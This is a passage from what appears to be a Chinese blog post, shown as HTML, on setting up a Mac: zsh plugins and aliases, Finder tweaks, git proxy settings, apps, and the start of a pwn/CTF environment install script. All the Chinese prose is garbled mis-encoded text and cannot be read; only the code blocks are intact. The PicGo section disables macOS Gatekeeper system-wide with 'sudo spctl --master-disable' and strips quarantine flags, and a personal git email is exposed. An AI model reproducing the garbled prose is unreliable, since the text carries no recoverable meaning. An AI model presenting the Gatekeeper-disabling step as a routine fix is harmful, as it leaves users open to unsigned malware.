https://github.com/zsh-users/zsh-autosuggestions <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-autosuggestions</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-completions <span class="variable">$&#123;ZSH_CUSTOM:-<span class="variable">$&#123;ZSH:-~/.oh-my-zsh&#125;</span>/custom&#125;</span>/plugins/zsh-completions</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/zdharma-continuum/fast-syntax-highlighting.git <span class="variable">$&#123;ZSH_CUSTOM:-<span class="variable">$HOME</span>/.oh-my-zsh/custom&#125;</span>/plugins/fast-syntax-highlighting</span><br></pre></td></tr></table></figure><p> <code>.zshrc</code> é…ç½®ï¼Œä¸å¾—ä¸è¯´ï¼Œalias æ˜¯çœŸçš„å¥½ç”¨ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> ZSH=<span class="string">&quot;<span class="variable">$HOME</span>/.oh-my-zsh&quot;</span></span><br><span class="line"></span><br><span class="line">ZSH_THEME=<span class="string">&quot;robbyrussell&quot;</span></span><br><span class="line"></span><br><span class="line">plugins=(</span><br><span class="line">  git</span><br><span class="line">  zsh-completions</span><br><span class="line">  zsh-autosuggestions</span><br><span class="line">  fast-syntax-highlighting</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">DISABLE_MAGIC_FUNCTIONS=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">zstyle</span> <span class="string">&#x27;:omz:update&#x27;</span> mode disabled</span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> <span class="variable">$ZSH</span>/oh-my-zsh.sh</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="string">&quot;/usr/local/bin:/usr/local/sbin:/opt/homebrew/bin:/opt/homebrew/sbin:<span class="variable">$PATH</span>&quot;</span></span><br><span class="line"><span class="built_in">eval</span> <span class="string">&quot;<span class="subst">$(starship init zsh)</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Disable brew auto update</span></span><br><span class="line"><span class="built_in">export</span> HOMEBREW_NO_AUTO_UPDATE=1</span><br><span class="line"><span class="built_in">export</span> ZSH=<span class="string">&quot;<span class="variable">$HOME</span>/.oh-my-zsh&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Alias</span></span><br><span class="line"><span class="built_in">alias</span> ,ms=<span class="string">&quot;%PATH/TO/MY/SCRIPT%&quot;</span></span><br><span class="line"><span class="built_in">alias</span> ,ip=<span class="string">&quot;ipconfig getifaddr en0&quot;</span></span><br><span class="line"><span class="built_in">alias</span> ,sshconfig=<span class="string">&quot;vim ~/.ssh/config&quot;</span></span><br><span class="line"><span class="built_in">alias</span> ,gitconfig=<span class="string">&quot;vim ~/.gitconfig&quot;</span></span><br><span class="line"><span class="built_in">alias</span> c=<span class="string">&#x27;code .&#x27;</span></span><br><span class="line"><span class="comment"># cd</span></span><br><span class="line"><span class="built_in">alias</span> ..=<span class="string">&#x27;cd ../&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> ...=<span class="string">&#x27;cd ../../&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> ..l.=<span class="string">&#x27;cd ../../ &amp;&amp; ll&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> ....=<span class="string">&#x27;cd ../../../&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> ~=<span class="string">&quot;cd ~&quot;</span></span><br><span class="line"><span class="comment"># alias -- -=&quot;cd -&quot;</span></span><br><span class="line"><span class="built_in">alias</span> ll=<span class="string">&#x27;ls -alhG&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> <span class="built_in">ls</span>=<span class="string">&#x27;ls -G&#x27;</span></span><br></pre></td></tr></table></figure><p>å…³æ‰ URL ç‰¹æ®Šç¬¦å·è½¬ä¹‰ï¼Œå–æ¶ˆä¸‹é¢å†…å®¹çš„æ³¨é‡Šï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DISABLE_MAGIC_FUNCTIONS=true</span><br></pre></td></tr></table></figure><p>ç¦ç”¨ zsh è‡ªåŠ¨æ›´æ–°</p><p>æ–°ç‰ˆæœ¬çš„ zsh ç¦ç”¨è‡ªåŠ¨æ›´æ–°çš„æ–¹å¼ç¨å¾®æœ‰ç‚¹å˜åŒ–ï¼Œå–æ¶ˆä¸‹é¢å†…å®¹çš„æ³¨é‡Šå³å¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zstyle &#x27;:omz:update&#x27; mode disabled</span><br></pre></td></tr></table></figure><h3 id="starship"><a href="#starship" class="headerlink" title="starship"></a>starship</h3><p>rust å†™çš„ä¸€ä¸ªç»ˆç«¯çš„ prompt å·¥å…·.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">brew install starship</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;eval &quot;$(starship init zsh)&quot;&#x27;</span> &gt;&gt; ~/.zshrc</span><br></pre></td></tr></table></figure><h2 id="è®¿è¾¾æ˜¾ç¤ºæ‰€æœ‰éšè—æ–‡ä»¶"><a href="#è®¿è¾¾æ˜¾ç¤ºæ‰€æœ‰éšè—æ–‡ä»¶" class="headerlink" title="è®¿è¾¾æ˜¾ç¤ºæ‰€æœ‰éšè—æ–‡ä»¶"></a>è®¿è¾¾æ˜¾ç¤ºæ‰€æœ‰éšè—æ–‡ä»¶</h2><p>å¿«æ·é”®ï¼š<code>command + shift + .</code></p><p>æ°¸ä¹…è®¾ç½®ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">defaults write com.apple.finder AppleShowShowAllFiles -boolean <span class="literal">true</span>;killall Finder</span><br></pre></td></tr></table></figure><h2 id="è®¿è¾¾æ˜¾ç¤ºç»å¯¹è·¯å¾„"><a href="#è®¿è¾¾æ˜¾ç¤ºç»å¯¹è·¯å¾„" class="headerlink" title="è®¿è¾¾æ˜¾ç¤ºç»å¯¹è·¯å¾„"></a>è®¿è¾¾æ˜¾ç¤ºç»å¯¹è·¯å¾„</h2><p>å¿«æ·é”®ï¼š<code>option + command + P</code></p><p>è®¾ç½®åœ¨æ ‡é¢˜æ æ˜¾ç¤ºå®Œæ•´è·¯å¾„ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">defaults write com.apple.finder _FXShowPosixPathInTitle -bool YES;killall Finder</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿˜åŸ</span></span><br><span class="line">defaults delete com.apple.finder _FXShowPosixPathInTitle;killall Finder</span><br></pre></td></tr></table></figure><h2 id="è®¿è¾¾é¢„è§ˆæ’ä»¶"><a href="#è®¿è¾¾é¢„è§ˆæ’ä»¶" class="headerlink" title="è®¿è¾¾é¢„è§ˆæ’ä»¶"></a>è®¿è¾¾é¢„è§ˆæ’ä»¶</h2><p>æ”¶é›†äº†å¾ˆå¤šæ’ä»¶çš„ github é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/sindresorhus/quick-look-plugins">https://github.com/sindresorhus/quick-look-plugins</a></p><p>å®‰è£…ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install highlight qlcolorcode qlimagesize qlstephen qlmarkdown quicklook-json webpquicklook qlvideo</span><br></pre></td></tr></table></figure><ul><li><code>highlight &amp; qlcolorcode</code>ï¼šé¢„è§ˆè¯­æ³•é«˜äº®</li><li><code>qlcolorcode</code>ï¼šä»£ç æ–‡ä»¶é¢„è§ˆæ—¶é«˜äº®</li><li><code>qlimagesize</code>ï¼šé¢„è§ˆå›¾ç‰‡æ˜¾ç¤ºå›¾ç‰‡å¤§å°</li><li><code>qlstephen</code>ï¼šä»¥çº¯æ–‡æœ¬çš„å½¢å¼é¢„è§ˆæ— æ‹“å±•åæˆ–è€…æœªçŸ¥æ‹“å±•åçš„æ–‡ä»¶</li><li><code>qlmarkdown</code>ï¼šé¢„è§ˆæ¸²æŸ“åçš„ markdown æ–‡ä»¶</li><li><code>quicklook-json</code>ï¼š é¢„è§ˆæ ¼å¼åŒ–åçš„ json æ–‡ä»¶</li><li><code>webpquicklook</code>ï¼šé¢„è§ˆ webp å›¾ç‰‡</li><li><code>qlvideo</code>ï¼šé¢„è§ˆ <code>.mkv</code>ç­‰éåŸç”Ÿæ”¯æŒçš„è§†é¢‘æ ¼å¼æ–‡ä»¶</li><li><code>betterzipql</code>ï¼šé¢„è§ˆ <code>zip</code> å‹ç¼©åŒ…çš„å†…å®¹å’Œç›®å½•<ul><li>è¿™ä¸ªéœ€è¦å»<a href="https://github.com/sindresorhus/quick-look-plugins%E5%8D%95%E7%8B%AC%E4%B8%8B%E8%BD%BD%E6%8F%92%E4%BB%B6%EF%BC%8C%E8%A7%A3%E5%8E%8B%E7%84%B6%E5%90%8E%E7%A7%BB%E5%8A%A8%E5%88%B0">https://github.com/sindresorhus/quick-look-pluginså•ç‹¬ä¸‹è½½æ’ä»¶ï¼Œè§£å‹ç„¶åç§»åŠ¨åˆ°</a> <code>~/Library/QuickLook</code>æ–‡ä»¶å¤¹é‡Œ</li></ul></li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230405181519560.png" alt="image-20230405181519560"></p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230405181600048.png" alt="image-20230405181600048"></p><h1 id="ç¼–ç¨‹ç›¸å…³"><a href="#ç¼–ç¨‹ç›¸å…³" class="headerlink" title="ç¼–ç¨‹ç›¸å…³"></a>ç¼–ç¨‹ç›¸å…³</h1><h2 id="git"><a href="#git" class="headerlink" title="git"></a>git</h2><p>å®‰è£…ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install git</span><br></pre></td></tr></table></figure><p>é…ç½®ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;C1everF0x&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;Oui0jr@163.com&quot;</span></span><br></pre></td></tr></table></figure><p>ä»£ç†ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.proxy <span class="string">&#x27;socks5://127.0.0.1:7890&#x27;</span></span><br><span class="line">git config --global https.proxy <span class="string">&#x27;socks5://127.0.0.1:7890&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="pycharm"><a href="#pycharm" class="headerlink" title="pycharm"></a>pycharm</h2><p>è¿˜æ²¡å¼€å§‹é…ç½®ï¼Œè¦é… anaconda</p><h2 id="clion"><a href="#clion" class="headerlink" title="clion"></a>clion</h2><p>è¿˜æ²¡å¼€å§‹é…ç½®</p><h2 id="vscode"><a href="#vscode" class="headerlink" title="vscode"></a>vscode</h2><p>å®‰è£…äº† picgoã€ssh ç­‰å°æ’ä»¶ï¼Œä¸€èˆ¬ç”¨æ¥å½“æ–‡æœ¬ç¼–è¾‘å™¨çœ‹ä»£ç æˆ–è€…è¿æœåŠ¡å™¨å†™åšå®¢ï¼Œä¸è¿è¡Œä»£ç ã€‚</p><h2 id="Microsoft-Remote-Desktop-Beta"><a href="#Microsoft-Remote-Desktop-Beta" class="headerlink" title="Microsoft Remote Desktop Beta"></a>Microsoft Remote Desktop Beta</h2><p>å¾®è½¯å®˜æ–¹çš„è¿œç¨‹è¿æ¥ win çš„ç®¡ç†è½¯ä»¶ï¼Œç”¨æ¥è¿æ¥è€ç”µè„‘ã€‚</p><h2 id="Obsidian"><a href="#Obsidian" class="headerlink" title="Obsidian"></a>Obsidian</h2><p>å†™æ–‡æ¡£ã€å­¦ä¹ ç¬”è®°ç­‰ï¼Œé…ç½®äº† iCloud å¤šç«¯åŒæ­¥ï¼Œç›´æ¥æŠŠåº“åˆ›åœ¨ iCloud äº‘ç›˜é‡Œé¢å°±å¯ä»¥äº†ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230407004908232.png" alt="image-20230407004908232"></p><h1 id="å…¶ä»–ç›¸å…³"><a href="#å…¶ä»–ç›¸å…³" class="headerlink" title="å…¶ä»–ç›¸å…³"></a>å…¶ä»–ç›¸å…³</h1><h2 id="å¾®è½¯ä¸‰ä»¶å¥—-todo"><a href="#å¾®è½¯ä¸‰ä»¶å¥—-todo" class="headerlink" title="å¾®è½¯ä¸‰ä»¶å¥— + todo"></a>å¾®è½¯ä¸‰ä»¶å¥— + todo</h2><p>ä¸æƒ³ç”¨ wpsã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230407005018833.png" alt="image-20230407005018833"></p><h2 id="è…¾è®¯æ–‡æ¡£"><a href="#è…¾è®¯æ–‡æ¡£" class="headerlink" title="è…¾è®¯æ–‡æ¡£"></a>è…¾è®¯æ–‡æ¡£</h2><p>å¤šç«¯åŒæ­¥ï¼Œå…è´¹ï¼Œç”¨æ¥å†™è€ƒç ”çš„æœˆã€æ—¥è®¡åˆ’å’Œå…¶ä»–çš„è¡¨æ ¼å®‰æ’ã€‚</p><h2 id="é’‰é’‰ã€è…¾è®¯ä¼šè®®"><a href="#é’‰é’‰ã€è…¾è®¯ä¼šè®®" class="headerlink" title="é’‰é’‰ã€è…¾è®¯ä¼šè®®"></a>é’‰é’‰ã€è…¾è®¯ä¼šè®®</h2><p>å¼€æ™šç‚¹åæˆ–è€…å¼€ä¼šç”¨ã€‚</p><h2 id="QQã€å¾®ä¿¡ã€telegram"><a href="#QQã€å¾®ä¿¡ã€telegram" class="headerlink" title="QQã€å¾®ä¿¡ã€telegram"></a>QQã€å¾®ä¿¡ã€telegram</h2><p>ç•¥ã€‚</p><h2 id="åŠ›æ‰£"><a href="#åŠ›æ‰£" class="headerlink" title="åŠ›æ‰£"></a>åŠ›æ‰£</h2><p>æ¯æ—¥ä¸€é¢˜ã€‚</p><h2 id="ä¸èƒŒå•è¯"><a href="#ä¸èƒŒå•è¯" class="headerlink" title="ä¸èƒŒå•è¯"></a>ä¸èƒŒå•è¯</h2><p>åšæŒèƒŒå•è¯ï¼Œç™¾åˆ©æ— ä¸€å®³ã€‚</p><h2 id="OBS"><a href="#OBS" class="headerlink" title="OBS"></a>OBS</h2><p>å½•å±ã€‚</p><h2 id="ç™¾åº¦ã€é˜¿é‡Œç½‘ç›˜"><a href="#ç™¾åº¦ã€é˜¿é‡Œç½‘ç›˜" class="headerlink" title="ç™¾åº¦ã€é˜¿é‡Œç½‘ç›˜"></a>ç™¾åº¦ã€é˜¿é‡Œç½‘ç›˜</h2><p>æ€»ä¼šç”¨åˆ°ã€‚</p><h2 id="ç½‘æ˜“äº‘ã€QQéŸ³ä¹"><a href="#ç½‘æ˜“äº‘ã€QQéŸ³ä¹" class="headerlink" title="ç½‘æ˜“äº‘ã€QQéŸ³ä¹"></a>ç½‘æ˜“äº‘ã€QQéŸ³ä¹</h2><p>ä¸€ä¸ªæ—¥å¸¸å¬ï¼Œä¸€ä¸ªç”¨æ¥å¬å‘¨è‘£é™ˆå¥•è¿…ã€‚</p><h2 id="Guitar-Pro8"><a href="#Guitar-Pro8" class="headerlink" title="Guitar Pro8"></a>Guitar Pro8</h2><p>çœ‹å‰ä»–è°±ã€‚</p><h2 id="Logic-Options-ã€GHUB"><a href="#Logic-Options-ã€GHUB" class="headerlink" title="Logic Options+ã€GHUB"></a>Logic Options+ã€GHUB</h2><p>Master3s å’Œ G502 æ— çº¿è¦ç”¨ã€‚</p><h2 id="Picgo"><a href="#Picgo" class="headerlink" title="Picgo"></a>Picgo</h2><p>è´Ÿè´£ä¸Šä¼ å›¾ç‰‡åˆ°å›¾åºŠï¼Œå¯ä»¥è”åŠ¨ Typora å’Œ vscodeï¼Œä½¿ç”¨ Vue ä¸»é¢˜ã€‚</p><p><a href="https://picgo.github.io/PicGo-Doc/zh/">å®˜ç½‘</a></p><p><a href="https://github.com/Molunerfinn/PicGo/releases">githubä¸Šçš„release</a></p><p>è¸©å‘ï¼šå®‰è£…åæ‰“ä¸å¼€ï¼Œæ˜¾ç¤ºæ–‡ä»¶æŸåã€‚</p><p>åŸå› ï¼š PicGo æ²¡æœ‰ç­¾åï¼Œæ‰€ä»¥ä¼šè¢« macOS çš„å®‰å…¨æ£€æŸ¥æ‹¦ä¸‹ã€‚</p><p>è§£å†³ï¼šä¿¡ä»»å¼€å‘è€…ï¼Œä¼šè¦æ±‚è¾“å…¥å¯†ç :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo spctl --master-disable</span><br></pre></td></tr></table></figure><p>ç„¶åæ”¾è¡Œ PicGo :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xattr -cr /Applications/PicGo.app</span><br></pre></td></tr></table></figure><p>ç„¶åå°±èƒ½æ­£å¸¸æ‰“å¼€ã€‚</p><p>é…ç½®æ˜¯ç”¨è…¾è®¯äº‘COSæä¸ªå­˜å‚¨æ¡¶å½“å›¾åºŠï¼Œæ¯ä¸ªæœˆä¸€ä¸¤å—ã€‚</p><p><a href="https://picgo.github.io/PicGo-Doc/zh/guide/config.html#%E8%85%BE%E8%AE%AF%E4%BA%91cos">é…ç½®æ–‡æ¡£</a></p><h2 id="è¶…çº§å³é”®"><a href="#è¶…çº§å³é”®" class="headerlink" title="è¶…çº§å³é”®"></a>è¶…çº§å³é”®</h2><p>æ‰©å±•é¼ æ ‡å³é”®çš„èœå•åŠŸèƒ½ï¼Œæ¯”è¾ƒå®ç”¨ï¼Œå» App Store ä¸‹çš„å…è´¹ç‰ˆã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230404005107146.png" alt="image-20230404005107146"></p><p>æ•ˆæœï¼š</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/image-20230404005233415.png" alt="image-20230404005233415"></p><h2 id="Speed-Player"><a href="#Speed-Player" class="headerlink" title="Speed Player"></a>Speed Player</h2><p>æµè§ˆå™¨æ’ä»¶ï¼Œå¯ä»¥çªç ´æŸç§é™åˆ¶å€é€Ÿæ’­æ”¾è§†é¢‘ï¼Œç™¾åº¦äº‘çœ‹ç½‘è¯¾çš„æ—¶å€™ç”¨å¤„å¾ˆå¤§ã€‚</p><h2 id="Keka"><a href="#Keka" class="headerlink" title="Keka"></a>Keka</h2><p>å‹ç¼©å’Œè§£å‹ç”¨ï¼Œç±»ä¼¼äº Bandzipã€‚</p><h2 id="Mos"><a href="#Mos" class="headerlink" title="Mos"></a>Mos</h2><p>ä¼˜åŒ–é¼ æ ‡å’Œæ”¹é¼ æ ‡æ»‘è½®æ»šåŠ¨æ–¹å‘ï¼ˆmac é¼ æ ‡æ»‘è½®æ»šåŠ¨æ–¹å‘æ˜¯åçš„ï¼Œå¾€ä¸Šæ»šæ˜¯å¾€ä¸‹èµ°ï¼‰</p><h2 id="Monitor-Control"><a href="#Monitor-Control" class="headerlink" title="Monitor Control"></a>Monitor Control</h2><p>æ”¹æ˜¾ç¤ºå™¨äº®åº¦ï¼Œéè‹¹æœå®˜æ–¹è®¤è¯çš„ç¬¬ä¸‰æ–¹æ˜¾ç¤ºå™¨æ— æ³•ç›´æ¥åœ¨æ§åˆ¶ä¸­å¿ƒè°ƒäº®åº¦ã€‚</p><h2 id="TemperMonkey"><a href="#TemperMonkey" class="headerlink" title="TemperMonkey"></a>TemperMonkey</h2><p>æ²¹ğŸ’ã€‚</p><h2 id="Downie"><a href="#Downie" class="headerlink" title="Downie"></a>Downie</h2><p>å¾ˆç‰›çš„ä¸€ä¸ªè§†é¢‘ä¸‹è½½å™¨ï¼Œä»€ä¹ˆç½‘ç«™çš„è§†é¢‘éƒ½èƒ½ç»™é“¾æ¥å°±ä¸‹ã€‚</p><h2 id="ChatGPTå®¢æˆ·ç«¯"><a href="#ChatGPTå®¢æˆ·ç«¯" class="headerlink" title="ChatGPTå®¢æˆ·ç«¯"></a>ChatGPTå®¢æˆ·ç«¯</h2><p>github ä¸Šçœ‹åˆ°çš„ä¸€ä¸ªé¡¹ç›®ï¼Œå¾ˆæœ‰æ„æ€ï¼Œdown ä¸‹æ¥ç”¨ç€è¿˜è›®æ–¹ä¾¿çš„ã€‚</p><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/lencx/ChatGPT">https://github.com/lencx/ChatGPT</a></p><p>å®‰è£…ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">brew tap lencx/chatgpt https://github.com/lencx/ChatGPT.git</span><br><span class="line">brew install --cask chatgpt --no-quarantine</span><br></pre></td></tr></table></figure><h1 id="å®‰å…¨ç›¸å…³"><a href="#å®‰å…¨ç›¸å…³" class="headerlink" title="å®‰å…¨ç›¸å…³"></a>å®‰å…¨ç›¸å…³</h1><h2 id="pwn-ç¯å¢ƒ"><a href="#pwn-ç¯å¢ƒ" class="headerlink" title="pwn ç¯å¢ƒ"></a>pwn ç¯å¢ƒ</h2><p><del>é‡‡ç”¨ UTM æ¨¡æ‹Ÿ x86 è™šæ‹Ÿæœºæ¥æ­å»º pwn ç¯å¢ƒï¼Œå±äºæ˜¯æ›²çº¿æ•‘å›½äº†ã€‚å‚è€ƒæ•™ç¨‹ï¼š<a href="https://www.bilibili.com/video/BV1HM4y1X7Fy/">è§†é¢‘æ•™ç¨‹</a> å’Œ <a href="https://mu-sec.github.io/2022/11/16/Mac-M1%E6%9C%AC%E5%9C%B0%E9%9D%9Edocker%E5%8F%AF%E8%B0%83%E8%AF%95PWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">åšå®¢æ•™ç¨‹</a></del></p><blockquote><p>å®é™…ä½“éªŒä¸‹æ¥å°±æ˜¯ï¼Œç›®å‰ä»»ä½•ä¸€ç§åœ¨ arm æ¶æ„ä¸Šæ­ x86 è™šæ‹Ÿæœºçš„æ–¹æ¡ˆï¼ˆqemuã€utmã€dockerï¼‰ï¼Œæå‡ºæ¥çš„è™šæ‹Ÿæœºæ€§èƒ½éƒ½æœ‰å¾ˆå¤§æŸå¤±ã€‚UTM åœ¨å®‰è£…è™šæ‹Ÿæœºçš„æ—¶å€™ï¼Œéå¸¸éå¸¸éå¸¸æ…¢ï¼Œéå¸¸éå¸¸éå¸¸å¡ï¼ŒæŠŠæ¡Œé¢ç§»é™¤æ‰ä»¥åå‘½ä»¤è¡Œæ‰æµç•…å¾ˆå¤šã€‚</p><p>æœ€åè¿˜æ˜¯æ²¡æœ‰é‡‡ç”¨è¿™ä¸ªæ–¹æ¡ˆï¼Œåº”è¯¥æ˜¯æˆ‘çš„é—®é¢˜æ¯”è¾ƒå¤§ï¼ŒUTM æœ‰ä¸‰ç§ç½‘ç»œæ¨¡å¼ï¼Œæˆ‘çš„è¿™å°ç”¨æ¨¡æ‹Ÿ VLAN å¯ä»¥ä¸Šç½‘ï¼Œä½†æ˜¯å®¿ä¸»æœºæ²¡åŠæ³• ssh è¿ï¼Œç”¨å…±äº«ç½‘ç»œå’Œæ¡¥æ¥éƒ½æ²¡åŠæ³•ä¸Šç½‘ï¼Œä½†æ˜¯å¯ä»¥å®¿ä¸»æœº ssh è¿ï¼Œåº”è¯¥æ˜¯æ ¡å›­ç½‘çš„ç½‘ç»œé—®é¢˜ï¼Œä¹‹åç½‘ç»œç¯å¢ƒå˜åŒ–äº†å¯ä»¥å†çœ‹çœ‹ã€‚</p><p>è¿™ä¸ªæ–¹æ¡ˆæ˜¯å¯è¡Œçš„ï¼Œä½†æ˜¯ç°é˜¶æ®µè¿˜æ˜¯ä¸å¥½ç”¨ã€‚</p></blockquote><p>æœ€åçš„æ–¹æ¡ˆæ˜¯ç”¨å­¦ç”Ÿæœºæ­ pwn ç¯å¢ƒï¼Œå®¿ä¸»æœº ssh è¿ä¸Šå»æ‰“ã€‚</p><p><strong>init_pwn.shï¼š</strong></p><p>è¿™ä¸ªæ˜¯æŠ„ wjh å¸ˆå‚…çš„ï¼Œé“¾æ¥ï¼š<a href="https://blog.wjhwjhn.com/archives/840/%EF%BC%8C%E7%A8%8D%E5%BE%AE%E6%9C%89%E7%82%B9%E6%94%B9%E5%8A%A8%EF%BC%8C%E5%9C%A8">https://blog.wjhwjhn.com/archives/840/ï¼Œç¨å¾®æœ‰ç‚¹æ”¹åŠ¨ï¼Œåœ¨</a> setuptools å¤„ã€‚åé¢çš„ git clone éœ€è¦æå‰é…ä¸€ä¸‹ä»£ç†ï¼Œä¸ç„¶è„šæœ¬å®¹æ˜“æ–­ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">set -e</span><br><span class="line">cd ~</span><br><span class="line">sudo apt-get -y update</span><br><span class="line">sudo apt-get -y install tzdata</span><br><span class="line">sudo apt-get -y install vim</span><br><span class="line">sudo apt-get -y install libxml2-dev</span><br><span class="line">sudo apt-get -y install libxslt-dev</span><br><span class="line">sudo apt-get -y install libmysqlclient-dev</span><br><span class="line">sudo apt-get -y install libsqlite3-dev</span><br><span class="line">sudo apt-get -y install zlib1g-dev</span><br><span class="line">sudo apt-get -y install python2-dev</span><br><span class="line">sudo apt-get -y install libffi-dev</span><br><span class="line">sudo apt-get -y install libssl-dev</span><br><span class="line">sudo apt-get -y install wget</span><br><span class="line">sudo apt-get -y install curl</span><br><span class="line">sudo apt-get -y install gcc</span><br><span class="line">sudo apt-get -y install clang</span><br><span class="line">sudo apt-get -y install make</span><br><span class="line">sudo apt-get -y install zip</span><br><span class="line">sudo apt-get -y install build-essential</span><br><span class="line">sudo apt-get -y install libncursesw5-dev libgdbm-dev libc6-dev</span><br><span class="line">sudo apt-get -y install tk-dev</span><br><span class="line">sudo apt-get -y install openssl</span><br><span class="line">sudo apt-get -y install virtualenv</span><br><span class="line">sudo apt-get -y install git</span><br><span class="line">sudo apt-get -y install proxychains4</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta 